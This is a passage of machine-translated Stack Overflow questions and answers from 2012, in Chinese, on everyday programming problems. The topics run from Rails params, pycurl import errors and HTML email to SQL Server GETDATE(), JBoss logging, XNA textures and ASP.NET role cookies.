    def mockReturnObject = {create your object to be returned here}
    def loader = [parseString:{ mockReturnObject }] as ReasoningXMLLoader
    service.reasoningXMLLoader = loader
    def result = service.parseXML(xml)
    do assertions here
} 
```

以下是如何对模拟执行相同操作：

```
void testParseXml() {
    String xml = "test string"
    def mockReturnObject = {create your object to be returned here}
    def loader = new MockFor(ReasoningXMLLoader)
    loader.demand.parseString{mockReturnObject}
    service.reasoningXMLLoader = loader.proxyInstance()
    def result = service.parseXML(xml)
    do assertions here
} 
```

我希望这对刚接触 Grails 和 Groovy 的人有所帮助。

# ruby-on-rails - 为 :params[] 添加值

> ID：12078167
> 
> 赞同：0
> 
> 时间：2012-08-22T17:11:54.757
> 
> 标签：ruby-on-rails, ruby, ruby-on-rails-3, ruby-on-rails-3.1

我有什么：（控制器中的操作）

```
def create
  @test = Test.new(params[:test])
  @test.save

  devicefiles = params[:devicefiles]
  if devicefiles != nil
    devicefiles.each do |attrs|
      devicenote = Testdevicenote.new(attrs, :test_id => @test.id)
      devicenote.save
    end
  end

end 
```

此控制器操作不显示任何错误消息并呈现视图，但 :test_id 未保存在数据库中。我该如何解决这个问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T17:23:28.627

编辑：好的，哎呀，我现在看到了...

模型在初始化时只采用一个哈希，而不是 2。

```
Testobjectnote.new(attrs.merge(:test_id => @test.id)) 
```

* * *

简而言之，这里没有人有任何线索，因为这还不够信息。我们不知道您的模型是如何设置的。

但是在调试“不会保存”的模型时，通常最好使用 bang 版本`save`，`save!`. `save`返回`true`或`false`让您知道它是否能够保存记录。但是`save!`当模型无法保存时会引发异常，异常会告诉你原因。

该异常可能会告诉您为什么没有保存记录。

* * *

此外，通常最好使用关联，而不是自己管理 ID。

```
def create
  @test = Test.new(params[:test])

  if params[:devicefiles]
    params[:devicefiles].each do |attrs|
      @test.testdevicenotes << Testdevicenotes(attrs)
    end
  end

  @test.save
end 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T17:22:42.337

很难说，因为您没有使用发布到创建操作的表单发布您的视图，但如果它是典型的 Rails 表单，它可能应该如下所示：

```
def create
  @test = Test.new(params[:test])
  @test.save

  devicefiles = params[:test][:devicefiles]
  if devicefiles != nil
    devicefiles.each do |attrs|
      devicenote = Testdevicenote.new(attrs, :test_id => @test.id)
      devicenote.save
    end
  end

  objectfiles = params[:test][:objectfiles]
  if objectfiles != nil
    objectfiles.each do |attrs|
      objectnote = Testobjectnote.new(attrs, :test_id => @test.id)
      objectnote.save
    end
  end
end 
```

这假设 :devicefiles 和 :objectfiles 在 :test 形式内

# python - Pycurl 错误：AttributeError：“模块”对象没有属性“Curl”

> ID：12078168
> 
> 赞同：2
> 
> 时间：2012-08-22T17:12:00.007
> 
> 标签：python, pycurl

使用来自 pi 站点的 debian 映像的全新树莓派。

我用 sudo apt-get install python-pycurl

我的脚本看起来像这样

```
import pycurl
c = pycurl.Curl()
c.setopt(c.POST, 1)
c.setopt(c.SSL_VERIFYPEER, 1)
c.setopt(c.CAINFO, '/etc/ssl/certs/ca-certificates.crt')
c.setopt(c.URL, 'https://theurl.com')
c.setopt(c.USERPWD, 'user:pass')
c.setopt(c.POSTFIELDS, 'Field1=This&Field2=That')
c.perform() 
```

我得到这个

```
Traceback (most recent call last):
  File "pycurl.py", line 1, in <module>
import pycurl
  File "/home/pi/test/pycurl.py", line 3, in <module>
    c = pycurl.Curl()
AttributeError: 'module' object has no attribute 'Curl' 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-22T17:15:10.150

查看回溯中的路径。看起来您可能正在导入自己的名为 的模块`pycurl.py`，而不是实际的 pycurl 库。尝试将该文件重命名为其他文件，以便 Python 导入真正的 pycurl。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T17:23:22.807

python首先在当前目录中检查一个模块，然后在python目录中。将您的文件重命名为`mypicurl.py`或其他内容。否则，您只是在导入脚本。

编辑：我刚刚看到你的评论，这意味着你没有正确安装它。尝试重新安装或从 .deb 安装

# jquery - 将内容动态加载到常规网页或 jQuery mobile 中？

> ID：12078176
> 
> 赞同：1
> 
> 时间：2012-08-22T17:12:56.907
> 
> 标签：jquery, html, mobile

我有个问题。

我没有太多编程经验。我愿意快速学习，但我想确保我朝着正确的方向前进。

我正在寻找构建一个自动更新内容的 jQuery 移动应用程序。说到，我用普通的jquery mobile html5创建应用程序然后我想修改一些文本，或者不时改变一张图片？

最好的方法是什么，我需要学习什么？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-23T00:51:24.997

网络开发基础：

*   HTML
*   CSS
*   JavaScript
*   jQuery
*   jQuery 移动

您还需要使用诸如 PHP 之类的编程语言（或任何其他语言和 Web 框架，但对于初学者来说，这是一个容易开始的地方）。您可以使用 PHP 通过与数据库或其他内容源对话来生成动态内容。

# html - 有人擅长电子邮件编码吗？

> ID：12078182
> 
> 赞同：2
> 
> 时间：2012-08-22T17:13:17.030
> 
> 标签：html, css, html-table, html-email

我正在编写一封自定义电子邮件，自己为我的老板编写代码我以前没有这样做过，我知道这可能会很棘手，因为你必须更多地使用表格等等。

我的问题是我正在尝试将小图像添加到 div 或`<td>`颜色之上并放置在右上角的图像。

当我使用 hotmail 进行测试时，它不存在，但是当我在浏览器中预览时它的工作。我可以将图像创建为背景，但问题是当我的老板填写该区域中的内容时，它所在的内容区域会改变大小。

我基本上希望内容区域看起来像一张纸，上面有一点卷曲。

所以我对如何解决这个问题或最好的解决方案有点震惊，任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-22T17:20:50.683

好吧，HTML 电子邮件很糟糕。它基本上永远不会在任何地方看起来都一样。不过，为了提供帮助，您可以尝试阅读以下内容：

[http://htmlemailboilerplate.com/](http://htmlemailboilerplate.com/)

这是一组最佳实践，应该有助于使事情尽可能相似。

您还需要使用`table`s 进行布局（是的，我知道……），并尽量减少 CSS 对内联样式的使用，或者理想情况下，使用糟糕的旧 HTML1/2/3/4 方法（如`font`标签）。

我有没有提到 HTML 电子邮件很糟糕？

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-22T17:25:58.860

我也有一些运气审查

[http://24ways.org/2009/rock-solid-html-emails](http://24ways.org/2009/rock-solid-html-emails)

1.  基本上又假装是1997年。如果您不记得在 90 年代后期编写 HTML 对您有好处。但是，您是正确的，您以前依赖 css 的更多表。

2.  在多个电子邮件服务和客户端中进行审查。我很惊讶地看到，outlook 比 gmail 更好地显示了我的页面。Gmail 做得很差

3.  把事情简单化。我的 ENG 101 教授在为他的课程写论文时提出了同样的建议。但是，保持简单会为您省去很多麻烦。现在不是炫耀所有花哨的 css3 的时候。甚至考虑创建一个 pdf。我有关于 iText for java 和即时 pdf 生成的好消息。

4.  使用内联 CSS。我知道它感觉不对，而且很脏，但它解决了我的很多 css 问题。

5.  有没有人告诉过你 HTML 很烂？

# php - php判断一个变量是否是一个打开的文件句柄

> ID：12078187
> 
> 赞同：11
> 
> 时间：2012-08-22T17:13:36.700
> 
> 标签：php

我目前正在使用`is_resource()`来确定变量是否是打开的文件句柄。

这是正确的还是有其他（更好的）方法可以做到这一点？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-22T17:15:44.110

这会给您带来很多误报，例如数据库资源。

你应该[`get_resource_type`](http://www.php.net/manual/en/function.get-resource-type.php)改用。

# php - 旋转大尺寸图像在php中给出错误

> ID：12078188
> 
> 赞同：0
> 
> 时间：2012-08-22T17:13:37.440
> 
> 标签：php, php-gd

当我通过 rotateImage() 函数旋转小图像时，它工作正常。但如果大文件（5500 X 3000px）它会出错。我们如何在 php 中处理大图像。

```
// Content type
header('Content-type: image/jpeg');
// Load
$source = imagecreatefromjpeg($filename);
// Rotate
$rotate = imagerotate($source, $degrees, 0);
imagejpeg($rotate,'new.jpg'); 
```

当我们旋转图像时，它的内存大小和尺寸会增加，并且会出现内存不足的错误。我想旋转图像，类似于 photo-shop 旋转操作，每件事都与原始图像相同。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T17:26:36.113

我的猜测是，如果它适用于小图像但不适用于大图像，那么你的内存就会用完。如果是这种情况，您可以`php.ini`使用[memory_limit](http://php.net/manual/en/ini.core.php)增加内存限制。

您还应该运行您的脚本并确保您没有不必要地复制内容。尝试进行就地修改。

# android - EXTRA_AVAILABLE_VOICES 为空。为什么？

> ID：12078189
> 
> 赞同：1
> 
> 时间：2012-08-22T17:13:40.647
> 
> 标签：android, text-to-speech

在我的应用程序的主要活动中，我发出一个 Intent `ACTION_CHECK_TTS_DATA`：

```
Intent intent = new Intent();
intent.setAction(TextToSpeech.Engine.ACTION_CHECK_TTS_DATA);
startActivityForResult(intent, 0); 
```

当它返回时，在 onActivityResult() 中，我尝试列出可用的声音：

```
protected void onActivityResult(int requestCode, int resultCode, Intent intent) {
  if (requestCode == 0) {
    if (resultCode == TextToSpeech.Engine.CHECK_VOICE_DATA_PASS) {
        String availableVoices = intent.getStringExtra(TextToSpeech.Engine.EXTRA_AVAILABLE_VOICES);
        Log.d("TTS engine installed", "Available voices: " + availableVoices);
        new TextToSpeech(this, this);
    }
  }
} 
```

我*正在*接收`CHECK_VOICE_DATA_PASS`，一切正常，但根据 Log.d() 消息，`intent.getStringExtra(TextToSpeech.Engine.EXTRA_AVAILABLE_VOICES)`返回 null！

我知道我的手机里面有不少声音，安装好，工作正常，**为什么**`getStringExtra(TextToSpeech.Engine.EXTRA_AVAILABLE_VOICES)`返回null呢？

我错过了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T18:01:53.677

`getStringExtra()`您正在使用而不是[getStringArrayListExtra()](http://developer.android.com/reference/android/content/Intent.html#getStringArrayListExtra%28java.lang.String%29)获取 EXTRA_AVAILABLE_VOICES 列表。

有关更多详细信息，请参阅[此答案](https://stackoverflow.com/a/9993742/1124861)。

# java - 推荐用于 SMS 发送系统的 Java 并发/并行库

> ID：12078192
> 
> 赞同：1
> 
> 时间：2012-08-22T17:13:51.397
> 
> 标签：java, multithreading, concurrency, parallel-processing, sms

在我们公司，我们正在构建一个高需求系统，用于通过 SMPP 以及直接使用调制解调器向不同的客户和提供商发送 SMS。

系统处理不同的请求，并连接到数据库以选择消息并更新它们的状态（发送、接收、错误等）。我们收到发送短信的需求，这些短信按照优先级排队，根据请求通过不同的渠道发布。现在，需要生成线程来同时处理不同的通道，但这会使系统运行缓慢，因为事务可能很多。

我们有兴趣开发一个新系统，它不应该有太多的并发问题，并且可以最大限度地利用我们的服务器处理器。

据我们了解，我们的问题可以通过对请求线程的不同处理来重新构建系统来解决，¿您会推荐哪种架构、框架或库来处理这个问题，这将提供最佳性能？

我们目前正在考虑：Java 7 Fork/Join、IBIS（MPJ、GMI、Satin）和 AKKA（Actors 库），但这不是限制。还希望该系统不依赖于架构，并且可以是可扩展的并迁移到云服务。

PD：当前系统确实会为每个要发送的消息生成一个线程，并以某种方式使用线程池，但根本不是以优化的方式。除了改进糟糕的实现之外，我们还希望利用我们所有的资源（内核、处理器）来提高整体性能。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T17:50:32.983

> 现在，需要生成线程来同时处理不同的通道，但这会使系统运行缓慢，因为事务可能很多。

这句话的含义是，是线程使系统变慢，而不是事务带宽。你对此有何证据？

线程可能产生问题的唯一方法是线程数量过多以至于您遇到内存问题并且系统由于 GC 开销而运行缓慢。每个线程分配一个大的连续堆栈空间（默认为 512k），因此 2000 个线程（例如）将消耗 1gb 的核心。

验证线程是否存在问题的一种方法*是*使用 jconsole 或其他方式查看应用程序的内存使用情况。如果您所有的内存桶都已满，而 GC 按钮几乎什么也没做，那么您是正确的。要尝试的另一件事是使用固定大小的线程池，而不是为您收到的每个请求分叉一个线程。如果这提高了您的系统性能，但降低了您的事务吞吐量，那么您是正确的。

由于 SMPP 协议似乎是 TCP/IP，因此您不希望所有线程都处于等待循环中。如果你知道你的 NIO fu，那么使用 NIO 编写你自己的 SMPP 协议是可能的。

我还会[搜索 java NIO SMPP](https://www.google.com/search?q=java%20NIO%20SMPP)库。快速搜索将我带到[JSMPP](http://code.google.com/p/jsmpp/)。然而，我没有这方面的经验。

> JSMPP 是 SMPP 协议的 Java 实现（SMPP API）（目前支持 SMPP v3.4）。它提供与消息中心或 ESME（外部短消息实体）通信的接口，并且能够处理每秒 3000-5000 条消息的流量。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-06-04T05:08:33.953

[https://github.com/twitter/cloudhopper-smpp](https://github.com/twitter/cloudhopper-smpp)

Twitter 的 NIO SMPP 库基于 Netty 构建。目前用于支持数百家运营商`sending/receiving`每月绑定数十亿条消息。解决了每个`bind/message`. 有如何使用它的例子`cloudhopper-smpp/src/test/java/com/cloudhopper/smpp/demo/`

# vb.net - VB .net - 在字符串中找到第 N 次出现的字符的最短和最快方法？

> ID：12078193
> 
> 赞同：4
> 
> 时间：2012-08-22T17:13:52.333
> 
> 标签：vb.net

实现这一目标的专业方法是什么？

谢谢。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-22T17:21:56.253

我无耻地从[这个问题](https://stackoverflow.com/questions/2571716/find-nth-occurrence-of-a-character-in-a-string)中扯掉了这个例子，并将它从 C# 转换为 VB.net。

```
Public Function GetNthIndex(s As String, t As Char, n As Integer) As Integer
    Dim count As Integer = 0
    For i As Integer = 0 To s.Length - 1
        If s(i) = t Then
            count += 1
            If count = n Then
                Return i
            End If
        End If
    Next
    Return -1
End Function 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-08-22T18:52:30.963

这是使用 Linq 的一种方法。

```
Public Function GetNthIndex(searchString As String, charToFind As Char, n As Integer) As Integer
    Dim charIndexPair = searchString.Select(Function(c,i) new with {.Character = c, .Index = i}) _
                                    .Where(Function(x) x.Character = charToFind) _
                                    .ElementAtOrDefault(n-1)
    Return If(charIndexPair IsNot Nothing, charIndexPair.Index, -1)
End Function 
```

用法：

```
Dim searchString As String = "Assessment"
Dim index As Integer = GetNthIndex(searchString, "s", 4) 'Returns 5 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-22T19:48:43.107

如果你想要更快：

```
Public Function NthIndexOf(s As String, c As Char, n As Integer) As Integer
    Dim i As Integer = -1
    Dim count As Integer = 0

    While count < n AndAlso i >= 0
        i = s.IndexOf(c, i + 1)
        count += 1
    End While

    Return i

End Function 
```

尽管如果您要在一长串“a”中寻找第 n 个“a”（例如），它比 Mike C 的回答要慢一些。

编辑：根据 spacemonkeys 的评论进行了调整。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-22T21:36:20.410

我的 Andew 版本，但我相信这会考虑到第一个字符是否是您正在寻找的字符

```
 Public Function GetNthIndexStringFunc(s As String, t As String, n As Integer) As Integer
        Dim newFound As Integer = -1
        For i As Integer = 1 To n
            newFound = s.IndexOf(t, newFound + 1)
            If newFound = -1 Then
                Return newFound
            End If
        Next
        Return newFound
    End Function 
```

# javascript - node.js mongodb - collection.find().toArray(callback) - 回调不会被调用

> ID：12078194
> 
> 赞同：11
> 
> 时间：2012-08-22T17:13:52.890
> 
> 标签：javascript, node.js, mongodb, database

我刚开始使用 mongodb，但是在尝试在集合上使用 .find() 时遇到了问题。

我创建了一个 DataAccessObject，它打开一个特定的数据库，然后让您对其执行操作。这是代码：

构造**函数**：

```
var DataAccessObject = function(db_name, host, port){
    this.db = new Db(db_name, new Server(host, port, {auto_reconnect: true}, {}));
    this.db.open(function(){});
} 
```

一个**getCollection**函数：

```
DataAccessObject.prototype.getCollection = function(collection_name, callback) {
    this.db.collection(collection_name, function(error, collection) {
        if(error) callback(error);
        else callback(null, collection);
  });
}; 
```

**保存**功能：

```
DataAccessObject.prototype.save = function(collection_name, data, callback){
    this.getCollection(collection_name, function(error, collection){
        if(error) callback(error);
        else{
            //in case it's just one article and not an array of articles
            if(typeof (data.length) === 'undefined'){
                data = [data];
            }

            //insert to collection
            collection.insert(data, function(){
                callback(null, data);
            });
        }
    });
} 
```

似乎有问题的一个 - **findAll 函数**：

```
DataAccessObject.prototype.findAll = function(collection_name, callback) {
    this.getCollection(collection_name, function(error, collection) {
      if(error) callback(error)
      else {
        collection.find().toArray(function(error, results){
            if(error) callback(error);
            else callback(null, results);
        });
      }
    });
}; 
```

每当我尝试道。**findAll(error, callback)**，**回调**永远不会被调用。我已将问题缩小到代码的以下部分：

```
collection.find().toArray(function(error, result){
    //... whatever is in here never gets executed
}); 
```

我看过其他人是怎么做的。事实上，我非常密切地关注[本教程。](http://howtonode.org/express-mongodb)colelction.find().toArray() 似乎没有其他人有这个问题，而且它没有出现在我的搜索中。

谢谢，夏安。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-08-22T17:34:59.790

您没有使用`open`回调，因此如果您尝试`findall`在创建后立即发出请求，`dao`那么它将无法准备好。

如果您的代码是这样的，它将无法正常工作。

```
var dao = new DataAccessObject("my_dbase", "localhost", 27017);

dao.findAll("my_collection",function() {console.log(arguments);}); 
```

我测试了它，它没有找到记录，它也没有报错。我认为它应该给出一个错误。

但是如果你改变它以便给构造函数一个回调，那么它应该可以工作。

```
var DataAccessObject = function(db_name, host, port, callback){
    this.db = new Db(db_name, new Server(host, port, {auto_reconnect: true}, {}));
    this.db.open(callback);
} 
```

并使您的代码像这样。

```
var dao = new DataAccessObject("my_dbase", "localhost", 27017, function() {
    dao.findAll("my_collection",function() {console.log(arguments);});
}); 
```

# delphi - 如何绘制像 Delphi XE2 这样的控件对齐指示器？

> ID：12078201
> 
> 赞同：1
> 
> 时间：2012-08-22T17:14:14.627
> 
> 标签：delphi, form-designer

我有一个 Delphi 6 程序，它允许用户在页面上拖动控件。我通过在 MouseDown 事件中使用以下代码来做到这一点。

```
ReleaseCapture;                              
TWinControl(Sender).perform(WM_SYSCOMMAND,$F012,0); 
```

如何绘制一组与被拖动对象的左侧和顶部对齐的线条，以便用户可以将控件与其他控件对齐（类似于 XE2 设计）？

# sql - 在很多地方使用 GETDATE() 时，使用变量会更好吗？

> ID：12078202
> 
> 赞同：43
> 
> 时间：2012-08-22T17:14:15.223
> 
> 标签：sql, sql-server, performance, sql-server-2008, tsql

更好，我的意思是它会以非边际量提高性能吗？

也就是说，我每次调用`GETDATE()`，服务器返回那个值需要做多少*工作*？

如果我`GETDATE()`在存储过程的许多地方使用，我是否应该创建一个变量来存储事务的日期？

```
declare @transDate datetime = GETDATE() 
```

基准数据会很棒。

**编辑**我想澄清一下：我主要对这两种可能性之间的实际性能差异以及它是否重要感兴趣。

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2012-08-22T17:51:37.667

[注意：如果您要否决这个答案，请发表评论解释原因。它已经被否决了很多次，最后 ypercube（谢谢）至少解释了一个原因。我无法删除答案，因为它已被接受，因此您不妨帮助改进它。]

根据微软的这个交流，[`GETDATE()`从查询中的常量切换到 SQL Server 2005 中的非确定性](http://social.msdn.microsoft.com/forums/en-us/transactsql/thread/66507B8B-4A74-44C1-9637-3AB5F75DB6A0)。回想起来，我认为这并不准确。我认为它在 SQL Server 2005 之前完全是非确定性的，然后自 SQL Server 2005 起侵入了一种称为“非确定性运行时常量”的东西。后面的短语似乎真的意味着“查询中的常量”。

[（并且`GETDATE()`被定义为明确且自豪的非确定性，没有限定词。）](https://docs.microsoft.com/en-us/sql/relational-databases/user-defined-functions/deterministic-and-nondeterministic-functions)

唉，在 SQL Server 中，非确定性并不意味着对每一行都评估一个函数。SQL Server 确实使这变得不必要的复杂和模棱两可，几乎没有关于该主题的文档。

实际上，函数调用是在查询运行时评估的，而不是在编译查询时评估一次，并且每次调用它的值都会改变。在实践中，`GETDATE()`只对使用它的每个表达式进行一次评估——在*执行时而*不是*编译时*。但是，Microsoft 将`rand()`其`getdate()`归入一个特殊类别，称为非确定性运行时常量函数。相比之下，Postgres 不会跳过这样的环节，它只是调用在“稳定”执行时具有恒定值的函数。

尽管有 Martin Smith 的评论，但 SQL Server 文档在这个问题上根本没有明确说明——`GETDATE()`被描述为“非确定性”和“非确定性运行时常量”，但该术语并没有真正解释。 [例如，我在一个地方找到了术语](https://technet.microsoft.com/en-us/library/ms190642(v=sql.105).aspx)，文档中的下一行说不要在子查询中使用非确定性函数。对于“非确定性运行时常数”，这将是愚蠢的建议。

我建议即使在查询中也使用带有常量的变量，这样您就有了一致的值。这也使意图非常明确：您需要查询中的单个值。在单个查询中，您可以执行以下操作：

```
select . . . 
from (select getdate() as now) params cross join
     . . . 
```

实际上，这是一个只*应*在查询中评估一次的建议，但可能会有例外。由于在所有不同的行上返回相同的值，所以会出现混淆`getdate()`——但它可以在不同的列中返回不同的值。每个表达式`getdate()`都被独立评估。如果您运行，这很明显：

```
select rand(), rand()
from (values (1), (2), (3)) v(x); 
```

在存储过程中，您可能希望变量中有一个值。如果存储过程在午夜过去时运行，并且日期发生变化，会发生什么情况？这对结果有什么影响？

至于性能，我的猜测是日期/时间查找是最小的，并且当查询开始运行时，每个表达式都会发生一次查询。这不应该是真正的性能问题，而更多的是代码一致性问题。

* * *

## 回答 #2

> 赞同：18
> 
> 时间：2012-08-22T17:20:12.147

我的建议是使用变量，主要是因为如果您有一个长时间运行的进程，`GetDate()`调用之间的值可能会有所不同。

除非您只使用其中的`Date`一部分，`GetDate()`否则您将确保您始终使用相同的值。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2016-02-25T00:28:35.230

使用带有`getdate()`或类似函数的变量的一个原因`suser_sname()`是，如果您正在插入行，或者如果您正在执行`GROUP BY`. 如果您插入大量行，您会注意到这一点。

我自己将 300GB 的数据迁移到多个表时遇到了这种情况。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2017-05-25T15:30:05.547

我正在使用 GETDATE() 函数作为 SP 中的变量来测试几个存储过程，并且由于查询优化器不知道操作读取此[存储的值是什么，我的 IO 读取和执行时间增加了带有参数、变量和文字的过程执行，](https://www.sqlskills.com/blogs/kimberly/stored-procedure-execution-with-parameters-variables-and-literals/)也就是说，您可以在 SP 的每个部分中使用 GETDATE() 函数，因为[@Gordon Linoff](https://stackoverflow.com/a/12078717/1501497)提到它的值在执行期间不会改变，或者为了避免/消除这样的想法值可能会改变我确实以这种方式创建了一个参数：

```
CREATE PROC TestGetdate
(
@CurrentDate DATETIME = NULL
)
AS
SET CurrentDate  = GETDATE() 
```

.....然后使用你认为合适的参数，你会看到好的结果

欢迎任何意见或建议。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2016-09-09T01:00:34.453

我用了

```
WHERE ActualDateShipped+30 > dbo.Today() 
```

结合下面的功能。将我的查询时间从 13 秒缩短到 2 秒。这篇文章中没有先前的答案帮助 SQL 2008/R2 中的这个问题。

```
CREATE FUNCTION [dbo].[Today]()

    RETURNS date
    AS
    BEGIN

        DECLARE @today date = getdate()

        RETURN @today
    End 
```

# java - 访问附加的 jboss 日志文件

> ID：12078203
> 
> 赞同：1
> 
> 时间：2012-08-22T17:14:15.533
> 
> 标签：java, logging, jboss

我添加了另一个日志文件，我想知道如何从 Java 代码中访问它。我在上面找不到任何东西。

我想要一个用于用户操作的单独日志文件。

这是我的 Standalone.xml，适用于 JBOSS AS 7.1.1。

```
 <subsystem xmlns="urn:jboss:domain:logging:1.1">
        <console-handler name="CONSOLE">
            <level name="INFO"/>
            <formatter>
                <pattern-formatter pattern="%d{HH:mm:ss,SSS} %-5p [%c] (%t) %s%E%n"/>
            </formatter>
        </console-handler>
        <periodic-rotating-file-handler name="FILE">
            <formatter>
                <pattern-formatter pattern="%d{HH:mm:ss,SSS} %-5p [%c] (%t) %s%E%n"/>
            </formatter>
            <file relative-to="jboss.server.log.dir" path="server.log"/>
            <suffix value=".yyyy-MM-dd"/>
            <append value="true"/>
        </periodic-rotating-file-handler>
        <size-rotating-file-handler name="USER" autoflush="false">
            <level name="ALL"/>
            <file relative-to="jboss.server.log.dir" path="user.log"/>
            <rotate-size value="50m"/>
            <append value="true"/>
        </size-rotating-file-handler>
        <logger category="user" use-parent-handlers="false">
            <level name="ALL"/>
            <handlers>
                <handler name="USER"/>
            </handlers>
        </logger>
        <logger category="com.arjuna">
            <level name="WARN"/>
        </logger>
        <logger category="org.apache.tomcat.util.modeler">
            <level name="WARN"/>
        </logger>
        <logger category="sun.rmi">
            <level name="WARN"/>
        </logger>
        <logger category="jacorb">
            <level name="WARN"/>
        </logger>
        <logger category="jacorb.config">
            <level name="ERROR"/>
        </logger>
        <root-logger>
            <level name="INFO"/>
            <handlers>
                <handler name="CONSOLE"/>
                <handler name="FILE"/>
            </handlers>
        </root-logger>
    </subsystem> 
```

我正在尝试这样写：

```
import org.jboss.logging.Logger;
Logger logger = Logger.getLogger("USER");
logger.info("user did something"); 
```

它会在启动时创建 user.log，但仍会写入 server.log。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-23T16:14:13.690

您的类别不匹配。在配置中，您将记录器类别定义为`user`（小写）。在您的代码示例中，您将类别定义为`USER`（大写）。更改类别以匹配，它将起作用。

```
<subsystem xmlns="urn:jboss:domain:logging:1.1">
    ...
    <size-rotating-file-handler name="USER" autoflush="false">
        <level name="ALL"/>
        <file relative-to="jboss.server.log.dir" path="user.log"/>
        <rotate-size value="50m"/>
        <append value="true"/>
    </size-rotating-file-handler>
    <logger category="USER" use-parent-handlers="false">
        <level name="ALL"/>
        <handlers>
            <handler name="USER"/>
        </handlers>
    </logger>
    ...
</subsystem> 
```

# c# - Metro / WinRt 确定是否在编辑器/设计时

> ID：12078204
> 
> 赞同：3
> 
> 时间：2012-08-22T17:14:26.407
> 
> 标签：c#, microsoft-metro, windows-runtime

在 Wpf 中，你会做类似的事情

```
System.ComponentModel.DesignerProperties.GetIsInDesignMode() 
```

但我不知道如何检查我是否在 Win Rt 的设计师中。

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-08-22T17:16:58.793

> [`Windows.ApplicationModel.DesignMode.DesignModeEnabled`](http://msdn.microsoft.com/en-us/library/windows/apps/windows.applicationmodel.designmode.designmodeenabled)

# xna - 在 XNA 中运行时从图像加载纹理有什么风险？

> ID：12078206
> 
> 赞同：3
> 
> 时间：2012-08-22T17:14:30.943
> 
> 标签：xna, runtime, textures

关于在运行时从图像加载纹理（除了只能在 PC 上做到这一点）有什么要了解的？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-22T19:50:25.243

我也一直专门从流中加载我的纹理，我能想到的唯一“危险”是预乘 Alphas。您要么需要在加载每个纹理时对其进行处理，要么在禁用预乘 alpha 的情况下进行渲染。Shawn Hargreaves[就这个主题写了一篇很棒的博客文章](http://blogs.msdn.com/b/shawnhar/archive/2010/04/08/premultiplied-alpha-in-xna-game-studio-4-0.aspx)。在评论中，他提到：

> 如果您没有通过我们的内容管道，您必须自己处理格式转换，或者只是不使用预乘 alpha

[因此，使用BlendState.NonPremultiplied](http://msdn.microsoft.com/en-us/library/microsoft.xna.framework.graphics.blendstate.nonpremultiplied.aspx)初始化您的精灵批次应该可以工作。

在我的游戏中，我在加载时处理了每个纹理。

**编辑：**这是我的方法：

```
private static void PreMultiplyAlphas(Texture2D ret)
{
    var data = new Byte4[ret.Width * ret.Height];
    ret.GetData(data);
    for (var i = 0; i < data.Length; i++)
    {
        var vec = data[i].ToVector4();
        var alpha = vec.W / 255.0f;
        var a = (Int32)(vec.W);
        var r = (Int32)(alpha * vec.X);
        var g = (Int32)(alpha * vec.Y);
        var b = (Int32)(alpha * vec.Z);
        data[i].PackedValue = (UInt32)((a << 24) + (b << 16) + (g << 8) + r);
    }
    ret.SetData(data);
} 
```

如您所见，它所做的只是将颜色通道乘以 alpha，然后将其填充回纹理中。没有这个，你的精灵可能会显得更亮/更暗？比他们应该的。（免责声明：上面的方法不是我写的，我的一个朋友写的）

# asp.net - 缓存 RolePrincipal 的 cookie 文本长度始终大于 4096

> ID：12078210
> 
> 赞同：0
> 
> 时间：2012-08-22T17:14:39.107
> 
> 标签：asp.net, forms-authentication, roleprovider, role-based

我尝试为我的项目实现基于 ASP.NET 角色的授权，但我从未发现 cookie 保存在客户端浏览器中。我尝试了一些测试代码，例如，

```
RolePrincipal rolePrincipal = new RolePrincipal(new GenericIdentity("a"));
string text1 = rolePrincipal.ToEncryptedTicket(); 
```

在这个简单的 RolePrincipal 对象中没有任何角色，并且 Roles.CookieProtectionValue 设置为“无”。但是 text1 的长度为 4,688，大于 4,096，因此无法将 cookie 推送到客户端浏览器。

这是没有意义的，否则不可能使用 cookie 来缓存角色。

它出什么问题了？

谢谢

这是 web.config 中的相关部分

```
<authentication mode="Forms">
  <forms loginUrl="~/Account/LogOn" timeout="2880" name=".TestAUTH"/>
</authentication>
<membership>
  <providers>
    <clear/>
    <add name="AspNetSqlMembershipProvider" type="System.Web.Security.SqlMembershipProvider" connectionStringName="ApplicationServices"
         enablePasswordRetrieval="false" enablePasswordReset="true" requiresQuestionAndAnswer="false" requiresUniqueEmail="false"
         maxInvalidPasswordAttempts="5" minRequiredPasswordLength="6" minRequiredNonalphanumericCharacters="0" passwordAttemptWindow="10"
         applicationName="/" />
  </providers>
</membership>

<profile>
  <providers>
    <clear/>
    <add name="AspNetSqlProfileProvider" type="System.Web.Profile.SqlProfileProvider" connectionStringName="ApplicationServices" applicationName="/" />
  </providers>
</profile>

<roleManager enabled="true" cookieName=".TestROLE" cookieProtection="None" cacheRolesInCookie="true" cookieTimeout="30" cookiePath="/" cookieRequireSSL="false" cookieSlidingExpiration="false" >
  <providers>
    <clear/>
    <add name="AspNetSqlRoleProvider" type="System.Web.Security.SqlRoleProvider" connectionStringName="ApplicationServices" applicationName="/" />
    <!--<add name="AspNetWindowsTokenRoleProvider" type="System.Web.Security.WindowsTokenRoleProvider" applicationName="/" />-->
  </providers>
